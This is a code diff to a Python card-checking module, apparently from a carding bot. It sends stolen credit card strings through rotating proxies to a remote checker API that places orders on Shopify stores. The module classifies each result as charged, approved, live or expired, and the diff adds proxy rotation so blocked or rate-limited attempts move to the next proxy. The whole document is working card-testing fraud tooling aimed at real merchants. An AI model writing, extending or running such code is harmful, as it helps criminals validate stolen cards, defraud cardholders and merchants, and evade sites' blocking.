@@ -19,13 +19,12 @@ log.setLevel(logging.DEBUG)
 # ══════════════════════════════════════════════════════════════════════════════
 
 API_BASE = "http://5.175.222.144:8081"
-MAX_RETRIES = 5
-REQUEST_TIMEOUT = 120
+MAX_RETRIES = 2          # 5 → 2 (bot.py already handles higher-level retry)
+REQUEST_TIMEOUT = 60     # 120 → 60
 _CONNECT_TIMEOUT = 5
+RETRY_DELAY = 0.5        # 1.0 → 0.5
 
 # ── WHITELIST: Yehi responses "sahi" hain → NO retry, directly show ─────────
-# Agar response mein INMEIN SE KOI BHI word mile, samjho card result aaya hai.
-# Baaki sab (site errors, connection errors, unknown errors) → AUTO retry.
 _GOOD_RESPONSES = (
     # Charged / Success
     'order_placed', 'order completed', 'charged', 'approved', 'live',
@@ -42,6 +41,29 @@ _GOOD_RESPONSES = (
     '3ds', 'otp_required', 'authentication_required',
     'risky', 'ccn', 'live_limit',
     'cvv', 'ccv', 'zip',
+    # Additional card-level responses from logs
+    'base credit card is expired',
+    'payments_credit_card_base_expired',
+    'generic_error',
+    'decision_rule_block',
+    'validation_custom',
+)
+
+# ── BLACKLIST: Site-level dead errors → NO retry (immediately return) ───────
+_NO_RETRY_RESPONSES = (
+    'not a shopify site',
+    'http 404', '404 not found',
+    'cart must include a product',
+    'order subtotal is less than',
+    'payment flexibility terms id mismatch',
+    'merchandise_out_of_stock',
+    'amount_too_small', 'amount too small',
+    'delivery_address2_required',
+    'tax_new_tax_must_be_accepted',
+    'no valid payment method found',
+    'site error (http 429)',         # Rate limit — same proxy se retry bekaar
+    'site error (http 404)',         # Dead site
+    'unable to get payment token: 403',  # Proxy/site blocked
 )
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -137,6 +159,8 @@ def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
         "incorrect_zip", "insufficient funds",
     ]):
         status = "Approved"
+    elif "expired" in rl or "base credit card is expired" in rl:
+        status = "Expired"
     else:
         status = response
 
@@ -155,30 +179,34 @@ def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
 
 
 def _is_good_response(response_text: str) -> bool:
-    """
-    Auto-detect: True = proper card result (no retry needed).
-    False = site error / connection error / unknown → retry.
-    """
     if not response_text or response_text.strip().lower() == "unknown":
         return False
     rl = response_text.lower()
     return any(good in rl for good in _GOOD_RESPONSES)
 
 
+def _should_not_retry(response_text: str) -> bool:
+    """True = definitive non-retryable error (dead site, blocked proxy, etc.)"""
+    if not response_text:
+        return False
+    rl = response_text.lower()
+    return any(bad in rl for bad in _NO_RETRY_RESPONSES)
+
+
 # ══════════════════════════════════════════════════════════════════════════════
 #  SINGLE API CALL
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def _call_api(cc_str: str, proxy_str: str) -> dict:
+async def _call_api(cc_str: str, site_url: str, proxy_str: str) -> dict:
     """Call the checker API. Returns dict or raises on failure."""
     sess = await _get_session()
 
-    # Server expects literal '|' — yarl.URL(encoded=True) prevents %7C encoding
-    url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}"
+    site_param = f"&site={site_url}" if site_url else ""
+    url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}{site_param}"
     url = URL(url_str, encoded=True)
 
     cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
-    log.debug(f"[api] → {API_BASE} | cc=...{cc4} | proxy={proxy_str[:35]}...")
+    log.debug(f"[api] → {API_BASE} | cc=...{cc4} | site={site_url} | proxy={proxy_str[:35]}...")
 
     async with sess.get(
         url,
@@ -200,14 +228,31 @@ async def _call_api(cc_str: str, proxy_str: str) -> dict:
 #  PUBLIC API
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
+async def check_card_site(
+    cc_str: str,
+    site_url: str,
+    proxy_data: dict | None,
+    proxy_list: list | None = None,
+) -> dict:
     """
-    Main entry point (same signature as before so bot.py needs ZERO changes).
-    Auto-detect logic: proper card result = show immediately.
-    Any site/connection/unknown error = retry up to MAX_RETRIES.
+    Main entry point.
+    • Proper card result = return immediately
+    • Non-retryable site error = return immediately (no wasted retries)
+    • Retryable error = retry up to MAX_RETRIES with proxy rotation
     """
-    proxy_str = _proxy_data_to_proxy_str(proxy_data)
-    if not proxy_str:
+    # Build proxy rotation list
+    proxies: list[str] = []
+    if proxy_data:
+        pstr = _proxy_data_to_proxy_str(proxy_data)
+        if pstr:
+            proxies.append(pstr)
+    if proxy_list:
+        for p in proxy_list:
+            pstr = _proxy_data_to_proxy_str(p)
+            if pstr and pstr not in proxies:
+                proxies.append(pstr)
+
+    if not proxies:
         return {
             "Response": "No proxy – add one with /proxy",
             "Price": "-", "Gate": "-", "Status": "No proxy",
@@ -216,14 +261,16 @@ async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -
 
     t_start = time.monotonic()
     cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
-    log.info(f"[bridge] check_card_site | cc=...{cc4} | proxy={proxy_str[:25]}...")
+    log.info(f"[bridge] check_card_site | cc=...{cc4} | site={site_url} | proxies={len(proxies)}")
 
     last_result = None
     last_err = "Unknown error"
+    proxy_idx = 0
 
     for attempt in range(1, MAX_RETRIES + 1):
+        proxy_str = proxies[proxy_idx % len(proxies)]
         try:
-            raw = await _call_api(cc_str, proxy_str)
+            raw = await _call_api(cc_str, site_url, proxy_str)
             result = _map_result(raw, cc_str, site_url)
             response_text = result.get("Response", "")
 
@@ -232,27 +279,33 @@ async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -
                 f" | status={result.get('Status')} | resp={response_text[:60]}"
             )
 
-            # ✅ AUTO-DETECT: Agar proper card result hai → return immediately
+            # ✅ Good card result — return immediately
             if _is_good_response(response_text):
                 return result
 
-            # ⚠️ Error / Site issue / Unknown → retry karo
+            # 🚫 Blacklisted site error — return immediately (no wasted retries)
+            if _should_not_retry(response_text):
+                log.warning(f"[bridge] non-retryable error on attempt {attempt}: {response_text[:60]}")
+                return result
+
+            # ⚠️ Retryable — rotate proxy and retry
             last_result = result
-            last_err = f"Not a card result: {response_text[:80]}"
-            log.warning(f"[bridge] auto-detect: retrying attempt {attempt}...")
+            last_err = f"Retryable: {response_text[:80]}"
+            log.warning(f"[bridge] retrying attempt {attempt} with next proxy...")
 
             if attempt < MAX_RETRIES:
-                await asyncio.sleep(1.0)
+                proxy_idx += 1
+                await asyncio.sleep(RETRY_DELAY)
 
         except Exception as e:
             last_err = f"{type(e).__name__}: {str(e)[:80]}"
             log.warning(f"[bridge] attempt {attempt}/{MAX_RETRIES} exception — {last_err}")
             if attempt < MAX_RETRIES:
-                await asyncio.sleep(1.0)
+                proxy_idx += 1
+                await asyncio.sleep(RETRY_DELAY)
             else:
                 break
 
-    # Sab retries khatam
     if last_result is not None:
         log.warning(f"[bridge] all {MAX_RETRIES} retries done, returning last response")
         return last_result
